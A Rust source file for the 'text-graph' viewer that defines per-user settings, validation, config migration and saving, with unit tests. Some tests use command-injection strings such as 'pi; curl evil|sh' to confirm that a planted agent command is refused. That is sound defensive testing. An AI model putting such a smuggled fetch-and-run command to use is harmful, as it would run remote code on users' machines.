//! User preferences: the one place a setting is declared.
//!
//! Per USER, not per vault — `$XDG_CONFIG_HOME/text-graph/config`, else
//! `~/.config/text-graph/config`. Preferences follow the person (theme,
//! delays, which editor); `state.rs` keeps what belongs to a vault (camera,
//! card arrangement, pins, the web toggle).
//!
//! Every setting is one field plus one [`Spec`] row, and everything else is
//! derived from that table: the file format, the settings window, the
//! reset-to-default buttons, and the clamp applied on load. There is no
//! second list to keep in sync — the same reason `filetype.rs` is the only
//! place that says what an extension is.
//!
//! The file is trusted at the level of the user's shell rc (it lives in
//! their own config dir, and `extra_agents` is an explicit opt-in exactly
//! like `$TEXT_GRAPH_AGENTS`) — but values are still range-clamped and
//! choice-validated, because a hand-edited number should never be able to
//! park the viewer in an unusable state, and `default_agent` reaches
//! `sh -c`. Unknown keys are carried through load→save verbatim, so an
//! older binary can't erase a newer version's settings.

use std::path::{Path, PathBuf};

/// Longest accepted free-text value (editor/terminal command lines).
const TEXT_MAX: usize = 200;

#[derive(Clone, Debug, PartialEq)]
pub struct Config {
    // ---- appearance ----
    pub light: bool,
    pub label_density: f32,
    pub node_scale: f32,
    pub focus_fade: f32,
    pub finder_y: f32,
    pub thumbnails: bool,
    pub canvas_previews: bool,
    // ---- motion ----
    pub spread: f32,
    pub freeze: bool,
    pub glide: f32,
    pub zoom_speed: f32,
    // ---- previews ----
    pub preview_raw: bool,
    pub hover_previews: bool,
    pub hover_delay: f32,
    pub follow_delay: f32,
    // ---- search ----
    pub content_search: bool,
    pub search_max_kb: f32,
    // ---- tools ----
    pub editor: String,
    pub terminal: String,
    pub file_manager: String,
    // ---- agents ----
    pub default_agent: String,
    pub extra_agents: String,
    /// Keys this version doesn't understand, verbatim in file order —
    /// loaded so a save can write them back (forward compatibility).
    pub unknown: Vec<String>,
}

impl Default for Config {
    fn default() -> Self {
        Config {
            light: false,
            label_density: 1.0,
            node_scale: 1.0,
            focus_fade: 0.18,
            finder_y: 0.55,
            thumbnails: true,
            canvas_previews: true,
            spread: 1.0,
            freeze: false,
            glide: 0.18,
            zoom_speed: 1.0,
            preview_raw: false,
            hover_previews: true,
            hover_delay: 0.35,
            follow_delay: 0.12,
            content_search: true,
            search_max_kb: 1024.0,
            editor: String::new(),
            terminal: String::new(),
            file_manager: String::new(),
            default_agent: "pi".into(),
            extra_agents: String::new(),
            unknown: Vec::new(),
        }
    }
}

impl Config {
    /// Agent commands the one-click launcher may start: the built-in
    /// allowlist (plus `$TEXT_GRAPH_AGENTS`) and this config's extras.
    pub fn agent_choices(&self) -> Vec<String> {
        let mut v = crate::agents::default_allowlist();
        for extra in self
            .extra_agents
            .split(',')
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            if !v.iter().any(|a| a == extra) {
                v.push(extra.to_string());
            }
        }
        v
    }

    /// The agent the `a` key and the menu launch — validated against the
    /// allowlist at the point of USE as well as on load, since editing
    /// `extra_agents` can strip the choice out from under the selection.
    pub fn agent(&self) -> String {
        let allowed = self.agent_choices();
        let fallback = Config::default().default_agent;
        if allowed.contains(&self.default_agent) {
            self.default_agent.clone()
        } else if allowed.contains(&fallback) {
            fallback
        } else {
            allowed.first().cloned().unwrap_or(fallback)
        }
    }

    /// Content-search file-size ceiling, in bytes.
    pub fn search_max_bytes(&self) -> u64 {
        (self.search_max_kb.max(0.0) as u64).saturating_mul(1024)
    }

    /// Set a setting from its wire form, sanitizing per its spec. Unknown
    /// keys are kept verbatim for the next save.
    fn set_raw(&mut self, key: &str, raw: &str, line: &str) {
        match spec(key) {
            Some(s) => {
                if let Some(v) = s.kind.parse(raw) {
                    s.apply(self, v);
                }
            }
            None => self.unknown.push(line.to_string()),
        }
    }
}

// ---- the registry ----

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Section {
    Appearance,
    Motion,
    Previews,
    Search,
    Tools,
    Agents,
}

impl Section {
    pub const ALL: [Section; 6] = [
        Section::Appearance,
        Section::Motion,
        Section::Previews,
        Section::Search,
        Section::Tools,
        Section::Agents,
    ];

    pub fn title(self) -> &'static str {
        match self {
            Section::Appearance => "appearance",
            Section::Motion => "motion",
            Section::Previews => "previews",
            Section::Search => "search",
            Section::Tools => "tools",
            Section::Agents => "agents",
        }
    }

    pub fn blurb(self) -> &'static str {
        match self {
            Section::Appearance => "what the canvas looks like",
            Section::Motion => "how the layout and camera move",
            Section::Previews => "hover popups and the previews on the canvas",
            Section::Search => "what the picker scans",
            Section::Tools => "the programs the graph opens things with",
            Section::Agents => "what one keypress launches",
        }
    }
}

/// Widget shape and validation rule for a setting.
pub enum Kind {
    Flag,
    Num {
        min: f32,
        max: f32,
        step: f32,
        suffix: &'static str,
        decimals: usize,
    },
    /// One of a list computed from the config itself (the agent allowlist
    /// grows with `extra_agents`).
    Choice {
        options: fn(&Config) -> Vec<String>,
    },
    Text {
        hint: &'static str,
    },
}

#[derive(Clone, Debug, PartialEq)]
pub enum Value {
    Flag(bool),
    Num(f32),
    Text(String),
}

impl Value {
    pub fn as_flag(&self) -> bool {
        matches!(self, Value::Flag(true))
    }
    pub fn as_num(&self) -> f32 {
        match self {
            Value::Num(n) => *n,
            _ => 0.0,
        }
    }
    pub fn as_text(&self) -> &str {
        match self {
            Value::Text(s) => s,
            _ => "",
        }
    }
    fn wire(&self) -> String {
        match self {
            Value::Flag(b) => (if *b { "1" } else { "0" }).into(),
            Value::Num(n) => format!("{n}"),
            Value::Text(s) => s.clone(),
        }
    }
}

impl Kind {
    fn parse(&self, raw: &str) -> Option<Value> {
        match self {
            Kind::Flag => Some(Value::Flag(matches!(
                raw.trim(),
                "1" | "true" | "on" | "yes"
            ))),
            Kind::Num { .. } => raw.trim().parse::<f32>().ok().map(Value::Num),
            Kind::Choice { .. } | Kind::Text { .. } => Some(Value::Text(raw.to_string())),
        }
    }
}

pub struct Spec {
    pub key: &'static str,
    pub section: Section,
    pub label: &'static str,
    pub help: &'static str,
    pub kind: Kind,
    pub get: fn(&Config) -> Value,
    pub set: fn(&mut Config, Value),
}

impl Spec {
    /// Write `v` into `cfg` after sanitizing it for this spec's kind — the
    /// one gate every path (file load, settings window, reset) goes
    /// through, so a value that can't be reached by the UI can't be
    /// reached by hand-editing either. Returns whether validation accepted
    /// and applied the value.
    pub fn apply(&self, cfg: &mut Config, v: Value) -> bool {
        let clean = match (&self.kind, v) {
            (Kind::Flag, Value::Flag(b)) => Value::Flag(b),
            (Kind::Num { min, max, .. }, Value::Num(n)) => {
                if n.is_finite() {
                    Value::Num(n.clamp(*min, *max))
                } else {
                    self.default_value()
                }
            }
            (Kind::Choice { options }, Value::Text(s)) => {
                if (*options)(cfg).contains(&s) {
                    Value::Text(s)
                } else {
                    return false; // keep whatever is there; never take an unlisted command
                }
            }
            (Kind::Text { .. }, Value::Text(s)) => {
                let s = s.trim();
                if s.chars().any(char::is_control) || s.chars().count() > TEXT_MAX {
                    return false;
                }
                Value::Text(s.to_string())
            }
            _ => return false, // kind/value mismatch — a caller bug, not user data
        };
        (self.set)(cfg, clean);
        true
    }

    pub fn default_value(&self) -> Value {
        (self.get)(&Config::default())
    }

    pub fn is_default(&self, cfg: &Config) -> bool {
        (self.get)(cfg) == self.default_value()
    }

    pub fn reset(&self, cfg: &mut Config) {
        (self.set)(cfg, self.default_value());
    }

    /// Does this setting match a settings-window filter query? Matches the
    /// key, the label and the help text, so "delay" finds the dwell.
    pub fn matches(&self, needle: &str) -> bool {
        let n = needle.trim().to_lowercase();
        n.is_empty()
            || self.key.contains(&n)
            || self.label.to_lowercase().contains(&n)
            || self.help.to_lowercase().contains(&n)
            || self.section.title().contains(&n)
    }
}

/// Field read per value shape — `Flag`/`Num` are Copy, `Text` clones.
macro_rules! spec_get {
    (Flag, $c:ident, $f:ident) => {
        Value::Flag($c.$f)
    };
    (Num, $c:ident, $f:ident) => {
        Value::Num($c.$f)
    };
    (Text, $c:ident, $f:ident) => {
        Value::Text($c.$f.clone())
    };
}

macro_rules! specs {
    ($($key:literal, $section:expr, $label:literal, $help:literal, $kind:expr,
       $field:ident, $val:ident $(,)?);* $(;)?) => {
        &[$(Spec {
            key: $key,
            section: $section,
            label: $label,
            help: $help,
            kind: $kind,
            get: |c| spec_get!($val, c, $field),
            set: |c, v| {
                if let Value::$val(x) = v {
                    c.$field = x;
                }
            },
        }),*]
    };
}

const fn num(min: f32, max: f32, step: f32, suffix: &'static str, decimals: usize) -> Kind {
    Kind::Num {
        min,
        max,
        step,
        suffix,
        decimals,
    }
}

/// Every setting, in display order within its section.
pub fn specs() -> &'static [Spec] {
    SPECS
}

static SPECS: &[Spec] = specs![
        // ---- appearance ----
        "theme_light", Section::Appearance, "light theme",
        "dark by default; terminal cards stay dark either way",
        Kind::Flag, light, Flag;

        "label_density", Section::Appearance, "label density",
        "how early node labels fade in as you zoom",
        num(0.4, 2.5, 0.05, "×", 2), label_density, Num;

        "node_scale", Section::Appearance, "node size",
        "scales every node radius",
        num(0.5, 2.0, 0.05, "×", 2), node_scale, Num;

        "focus_fade", Section::Appearance, "unrelated fade",
        "how visible things outside the selection's neighborhood stay",
        num(0.0, 1.0, 0.02, "", 2), focus_fade, Num;

        "finder_y", Section::Appearance, "finder position",
        "how far down the window the finder's prompt sits — raise it to \
         see more results at once, lower it to keep more of the graph's \
         middle in view",
        num(0.1, 0.7, 0.01, "", 2), finder_y, Num;

        "thumbnails", Section::Appearance, "image thumbnails",
        "draw picture nodes as their contents once they are big enough",
        Kind::Flag, thumbnails, Flag;

        "canvas_previews", Section::Appearance, "text previews on canvas",
        "zoomed-in notes show an excerpt card instead of a dot",
        Kind::Flag, canvas_previews, Flag;

        // ---- motion ----
        "spread", Section::Motion, "layout spread",
        "how far apart the force layout pushes the graph",
        num(0.5, 2.0, 0.05, "×", 2), spread, Num;

        "freeze", Section::Motion, "freeze layout",
        "stop the simulation; dragged nodes stay exactly where you drop them",
        Kind::Flag, freeze, Flag;

        "glide", Section::Motion, "camera glide",
        "how long the camera takes to travel to a node; 0 jumps",
        num(0.0, 0.6, 0.02, "s", 2), glide, Num;

        "zoom_speed", Section::Motion, "zoom speed",
        "scroll-wheel zoom sensitivity",
        num(0.3, 3.0, 0.05, "×", 2), zoom_speed, Num;

        // ---- previews ----
        "preview_raw", Section::Previews, "source previews",
        "show notes as source with line numbers instead of rendered \
         markdown; the `r` key toggles it",
        Kind::Flag, preview_raw, Flag;

        "hover_previews", Section::Previews, "hover previews",
        "dwelling on a node (or a compact card) opens a popup",
        Kind::Flag, hover_previews, Flag;

        "hover_delay", Section::Previews, "hover dwell",
        "how long the pointer must rest before a popup opens",
        num(0.05, 2.0, 0.05, "s", 2), hover_delay, Num;

        "follow_delay", Section::Previews, "search follow delay",
        "how long a search result stays highlighted before the camera goes to it",
        num(0.0, 1.0, 0.02, "s", 2), follow_delay, Num;

        // ---- search ----
        "content_search", Section::Search, "search file contents",
        "off restricts the picker to names, aliases and paths",
        Kind::Flag, content_search, Flag;

        "search_max_kb", Section::Search, "content size limit",
        "files larger than this are not scanned for content matches",
        num(16.0, 8192.0, 16.0, " KB", 0), search_max_kb, Num;

        // ---- tools ----
        "editor", Section::Tools, "editor",
        "blank uses $VISUAL, then $EDITOR — set it here when the viewer is \
         launched from a desktop or IDE that has neither",
        Kind::Text { hint: "$VISUAL / $EDITOR" }, editor, Text;

        "terminal", Section::Tools, "terminal",
        "window opened for terminal editors; blank uses $TERMINAL, then the \
         first emulator on PATH",
        Kind::Text { hint: "$TERMINAL" }, terminal, Text;

        "file_manager", Section::Tools, "file manager",
        "what opening a folder starts; blank uses xdg-open",
        Kind::Text { hint: "xdg-open" }, file_manager, Text;

        // ---- agents ----
        "default_agent", Section::Agents, "default agent",
        "what the `a` key and one click on \"Launch …\" start",
        Kind::Choice { options: Config::agent_choices }, default_agent, Text;

        "extra_agents", Section::Agents, "extra agents",
        "comma-separated commands to add to the allowlist, like \
         $TEXT_GRAPH_AGENTS",
        Kind::Text { hint: "myagent, other" }, extra_agents, Text;
];

pub fn spec(key: &str) -> Option<&'static Spec> {
    specs().iter().find(|s| s.key == key)
}

// ---- file ----

/// Only what the user actually CHANGED is written. Writing every key
/// would freeze this build's defaults into the file forever: a later
/// version could improve a default and never reach anyone who had opened
/// the app once. It also makes the file say something — the settings
/// window is the list of what exists; the file is the list of what you
/// picked.
pub fn to_text(c: &Config) -> String {
    let mut out = String::from("text-graph config v1\n");
    for s in specs() {
        if s.is_default(c) {
            continue;
        }
        out.push_str(s.key);
        out.push('\t');
        out.push_str(&(s.get)(c).wire());
        out.push('\n');
    }
    for l in &c.unknown {
        out.push_str(l);
        out.push('\n');
    }
    out
}

pub fn from_text(text: &str) -> Config {
    let mut c = Config::default();
    for line in text.lines() {
        let line = line.trim_end_matches('\r');
        if line.is_empty() || line.starts_with('#') || line.starts_with("text-graph config") {
            continue;
        }
        // a key with no value is corrupt, not unknown — dropping it is
        // safer than writing it back forever
        if let Some((key, raw)) = line.split_once('\t') {
            c.set_raw(key, raw, line);
        }
    }
    c
}

/// `$XDG_CONFIG_HOME/text-graph/config`, else `~/.config/text-graph/config`.
pub fn path() -> Option<PathBuf> {
    let dir = std::env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|p| p.is_absolute())
        .or_else(|| std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".config")))?;
    Some(dir.join("text-graph").join("config"))
}

/// Result of loading per-user preferences. A read error is kept separate
/// from defaults so the app can remain usable without later overwriting a
/// config it never successfully read.
pub struct LoadedConfig {
    pub config: Config,
    pub read_error: Option<String>,
}

fn load_from(p: &Path) -> std::io::Result<(Config, bool)> {
    match std::fs::read_to_string(p) {
        Ok(text) => Ok((from_text(&text), true)),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok((Config::default(), false)),
        Err(e) => Err(std::io::Error::new(
            e.kind(),
            format!("cannot read {}: {e}", p.display()),
        )),
    }
}

/// First run: seed the per-user config from whatever this vault's view file
/// carried before preferences moved out of it, so a theme set under an
/// older build survives the upgrade.
pub fn load_or_migrate(vault: &Path) -> LoadedConfig {
    load_or_migrate_from(path().as_deref(), vault)
}

fn load_or_migrate_from(config_path: Option<&Path>, vault: &Path) -> LoadedConfig {
    let loaded = config_path.map_or_else(|| Ok((Config::default(), false)), load_from);
    let (mut config, existed) = match loaded {
        Ok(v) => v,
        Err(e) => {
            return LoadedConfig {
                config: Config::default(),
                read_error: Some(e.to_string()),
            };
        }
    };
    // Writing the file only when there was something to take matters: the
    // first vault opened would otherwise stamp defaults over the file and
    // a DIFFERENT vault's stored theme could never migrate afterwards.
    if !existed
        && migrate(&mut config, vault)
        && let Some(p) = config_path
    {
        let _ = save_to(p, &config);
    }
    LoadedConfig {
        config,
        read_error: None,
    }
}

/// Copy the preferences an older build stored in the vault's view file.
/// That file is UNTRUSTED (a vault can be someone else's), so the agent
/// goes through `Spec::apply` like every other value — the allowlist check
/// that used to live in the viewer's restore path lives here now.
/// Returns whether anything was actually carried over.
pub fn migrate(c: &mut Config, vault: &Path) -> bool {
    let vs = crate::state::load(vault);
    let mut took = false;
    if let Some(light) = vs.light {
        c.light = light;
        took = true;
    }
    if let Some(a) = vs.default_agent
        && let Some(s) = spec("default_agent")
    {
        took |= s.apply(c, Value::Text(a));
    }
    took
}

/// Write the config, creating its directory. Atomic (tmp + rename) through
/// the RESOLVED path: config files are commonly symlinks into a dotfiles
/// repo, and renaming over the link would silently replace it with a plain
/// file. Unlike the per-vault view file we do NOT refuse symlinks — this
/// one lives in the user's own config dir, where linking it is normal.
pub fn save(c: &Config) -> std::io::Result<()> {
    let Some(p) = path() else {
        return Err(std::io::Error::other("no HOME or XDG_CONFIG_HOME"));
    };
    save_to(&p, c)
}

/// `save` with the destination spelled out — the testable half.
pub fn save_to(p: &Path, c: &Config) -> std::io::Result<()> {
    let target = std::fs::canonicalize(p).unwrap_or_else(|_| p.to_path_buf());
    let dir = target
        .parent()
        .ok_or_else(|| std::io::Error::other("config path has no parent"))?;
    std::fs::create_dir_all(dir)?;
    let tmp = dir.join("config.tmp");
    std::fs::write(&tmp, to_text(c))?;
    std::fs::rename(&tmp, &target)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A value different from the current one, valid for the spec.
    fn other(s: &Spec, c: &Config) -> Value {
        match (&s.kind, (s.get)(c)) {
            (Kind::Flag, Value::Flag(b)) => Value::Flag(!b),
            (Kind::Num { min, max, .. }, Value::Num(n)) => {
                Value::Num(if (n - *max).abs() < 1e-6 { *min } else { *max })
            }
            (Kind::Choice { options }, Value::Text(t)) => Value::Text(
                (*options)(c)
                    .into_iter()
                    .find(|o| *o != t)
                    .expect("2 options"),
            ),
            (Kind::Text { .. }, _) => Value::Text("zzz".into()),
            _ => unreachable!("spec kind and field type disagree"),
        }
    }

    #[test]
    fn every_spec_reads_and_writes_its_own_field() {
        // The accessor table is fn pointers; a copy-pasted row would read
        // one field and write another, and nothing else would notice.
        for s in specs() {
            let mut c = Config::default();
            let want = other(s, &c);
            s.apply(&mut c, want.clone());
            assert_eq!((s.get)(&c), want, "{} did not read back", s.key);
            let changed: Vec<&str> = specs()
                .iter()
                .filter(|o| (o.get)(&c) != (o.get)(&Config::default()))
                .map(|o| o.key)
                .collect();
            assert_eq!(changed, vec![s.key], "{} moved another setting", s.key);
        }
    }

    #[test]
    fn keys_are_unique_and_wire_safe() {
        let mut seen = std::collections::HashSet::new();
        for s in specs() {
            assert!(seen.insert(s.key), "duplicate key {}", s.key);
            assert!(
                !s.key.contains('\t') && !s.key.is_empty(),
                "bad key {}",
                s.key
            );
        }
    }

    #[test]
    fn round_trips_through_the_file_format() {
        let mut c = Config::default();
        for s in specs() {
            let v = other(s, &c);
            s.apply(&mut c, v);
        }
        let back = from_text(&to_text(&c));
        assert_eq!(back, c);
    }

    #[test]
    fn defaults_round_trip_and_are_stable() {
        let c = Config::default();
        assert_eq!(from_text(&to_text(&c)), c);
        // determinism: same config, byte-identical file
        assert_eq!(to_text(&c), to_text(&from_text(&to_text(&c))));
    }

    #[test]
    fn numbers_are_clamped_and_junk_ignored() {
        let c = from_text(
            "text-graph config v1\n\
             hover_delay\t99\n\
             node_scale\t-5\n\
             glide\tnot-a-number\n\
             zoom_speed\tNaN\n",
        );
        assert_eq!(c.hover_delay, 2.0, "above max");
        assert_eq!(c.node_scale, 0.5, "below min");
        assert_eq!(c.glide, Config::default().glide, "unparseable kept default");
        assert_eq!(c.zoom_speed, Config::default().zoom_speed, "NaN rejected");
    }

    #[test]
    fn unknown_keys_survive_a_load_save_cycle() {
        let text = "text-graph config v1\nfuture_thing\t7\ntheme_light\t1\n";
        let c = from_text(text);
        assert!(c.light);
        let out = to_text(&c);
        assert!(
            out.contains("future_thing\t7"),
            "a newer version's setting was dropped: {out}"
        );
    }

    #[test]
    fn text_values_reject_control_characters_and_giants() {
        let mut c = Config::default();
        let s = spec("editor").unwrap();
        s.apply(&mut c, Value::Text("code --wait".into()));
        assert_eq!(c.editor, "code --wait");
        s.apply(&mut c, Value::Text("evil\tinjected".into()));
        assert_eq!(c.editor, "code --wait", "tab must not enter a value");
        s.apply(&mut c, Value::Text("x".repeat(TEXT_MAX + 1)));
        assert_eq!(c.editor, "code --wait", "over-long value refused");
        s.apply(&mut c, Value::Text("  hx  ".into()));
        assert_eq!(c.editor, "hx", "trimmed");
    }

    #[test]
    fn the_default_agent_must_be_allowlisted() {
        let mut c = Config::default();
        let s = spec("default_agent").unwrap();
        assert!(!s.apply(&mut c, Value::Text("pi; curl evil|sh".into())));
        assert_eq!(c.default_agent, "pi", "unlisted command refused");
        assert!(s.apply(&mut c, Value::Text("claude".into())));
        assert_eq!(c.default_agent, "claude");
        // extras widen the allowlist, exactly like $TEXT_GRAPH_AGENTS
        spec("extra_agents")
            .unwrap()
            .apply(&mut c, Value::Text("mycoder".into()));
        s.apply(&mut c, Value::Text("mycoder".into()));
        assert_eq!(c.default_agent, "mycoder");
    }

    #[test]
    fn agent_falls_back_when_extras_disappear() {
        let mut c = Config {
            extra_agents: "mycoder".into(),
            default_agent: "mycoder".into(),
            ..Config::default()
        };
        assert_eq!(c.agent(), "mycoder");
        c.extra_agents.clear();
        assert_eq!(c.agent(), "pi", "a stale choice must not reach sh -c");
    }

    #[cfg(unix)]
    #[test]
    fn saving_creates_the_dir_and_keeps_a_symlinked_config_a_symlink() {
        // Config files are commonly symlinks into a dotfiles repo; a plain
        // tmp+rename would replace the link with a regular file and the
        // repo would silently stop receiving changes.
        let base = std::env::temp_dir().join(format!("tg-cfgsave-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let dotfiles = base.join("dotfiles");
        std::fs::create_dir_all(&dotfiles).unwrap();
        let real = dotfiles.join("tg-config");
        std::fs::write(&real, "text-graph config v1\n").unwrap();
        let link = base.join("config").join("text-graph").join("config");
        std::fs::create_dir_all(link.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&real, &link).unwrap();

        let c = Config {
            light: true,
            ..Config::default()
        };
        save_to(&link, &c).unwrap();
        assert!(
            std::fs::symlink_metadata(&link).unwrap().is_symlink(),
            "the symlink was replaced by a regular file"
        );
        assert_eq!(from_text(&std::fs::read_to_string(&real).unwrap()), c);

        // and a plain path in a directory that doesn't exist yet
        let fresh = base.join("fresh").join("config");
        save_to(&fresh, &c).unwrap();
        assert_eq!(from_text(&std::fs::read_to_string(&fresh).unwrap()), c);
        let _ = std::fs::remove_dir_all(&base);
    }

    #[test]
    fn unreadable_config_is_not_treated_as_missing_or_migrated_over() {
        let base = std::env::temp_dir().join(format!("tg-cfgread-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let vault = base.join("vault");
        std::fs::create_dir_all(vault.join(".text-graph")).unwrap();
        std::fs::write(
            vault.join(".text-graph/view"),
            "text-graph view v1
light
",
        )
        .unwrap();
        let config_path = base.join("config");
        let planted = [0xff, 0xfe, 0xfd];
        std::fs::write(&config_path, planted).unwrap();

        let loaded = load_or_migrate_from(Some(&config_path), &vault);

        assert_eq!(loaded.config, Config::default());
        assert!(
            loaded
                .read_error
                .as_deref()
                .is_some_and(|e| e.contains("cannot read")),
            "the actual read failure must reach the app"
        );
        assert_eq!(
            std::fs::read(&config_path).unwrap(),
            planted,
            "migration must never replace a config that failed to load"
        );
        let _ = std::fs::remove_dir_all(base);
    }

    #[test]
    fn migration_takes_the_theme_but_not_a_planted_command() {
        // The view file is untrusted and the launch command runs through
        // `sh -c`: a vault that ships `agent\tpi; curl …|sh` must not be
        // able to seed it into the user's own config on first open.
        let d = std::env::temp_dir().join(format!("tg-migrate-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join(".text-graph")).unwrap();
        std::fs::write(
            d.join(".text-graph/view"),
            "text-graph view v1\nlight\nagent\tpi; curl evil | sh\n",
        )
        .unwrap();
        let mut c = Config::default();
        assert!(migrate(&mut c, &d), "there was something to take");
        assert!(c.light, "the theme carries over");
        assert_eq!(c.default_agent, "pi", "the planted command does not");

        // A rejected agent by itself is not a migration and must not create
        // a user config that prevents a later vault's real preferences from
        // being considered.
        std::fs::write(
            d.join(".text-graph/view"),
            "text-graph view v1\nagent\tpi; curl evil | sh\n",
        )
        .unwrap();
        let mut rejected = Config::default();
        assert!(!migrate(&mut rejected, &d));
        let config_path = d.join("user-config");
        let loaded = load_or_migrate_from(Some(&config_path), &d);
        assert_eq!(loaded.config, Config::default());
        assert!(
            !config_path.exists(),
            "a rejected value must not create config"
        );

        // A valid legacy agent does count and is carried over.
        std::fs::write(
            d.join(".text-graph/view"),
            "text-graph view v1\nagent\tclaude\n",
        )
        .unwrap();
        let mut accepted = Config::default();
        assert!(migrate(&mut accepted, &d));
        assert_eq!(accepted.default_agent, "claude");
        let loaded = load_or_migrate_from(Some(&config_path), &d);
        assert_eq!(loaded.config.default_agent, "claude");
        assert!(config_path.exists(), "an accepted value is persisted");

        // a vault that says nothing must not COUNT as a migration, or it
        // would stamp defaults over the config file and lock out the vault
        // that does have preferences stored
        std::fs::write(
            d.join(".text-graph/view"),
            "text-graph view v1\ncamera\t1\t2\t3\n",
        )
        .unwrap();
        let mut fresh = Config::default();
        assert!(!migrate(&mut fresh, &d), "nothing to carry over");
        let _ = std::fs::remove_dir_all(&d);
    }

    #[test]
    fn reset_restores_the_default() {
        let mut c = Config::default();
        let s = spec("hover_delay").unwrap();
        s.apply(&mut c, Value::Num(1.5));
        assert!(!s.is_default(&c));
        s.reset(&mut c);
        assert!(s.is_default(&c));
    }

    #[test]
    fn filter_finds_settings_by_word() {
        // help text counts, so a word from the explanation finds the row
        let hits: Vec<&str> = specs()
            .iter()
            .filter(|s| s.matches("dwell"))
            .map(|s| s.key)
            .collect();
        assert_eq!(hits, vec!["hover_previews", "hover_delay"]);
        let by_key: Vec<&str> = specs()
            .iter()
            .filter(|s| s.matches("zoom_speed"))
            .map(|s| s.key)
            .collect();
        assert_eq!(by_key, vec!["zoom_speed"]);
        assert!(specs().iter().all(|s| s.matches("")), "empty matches all");
    }
}
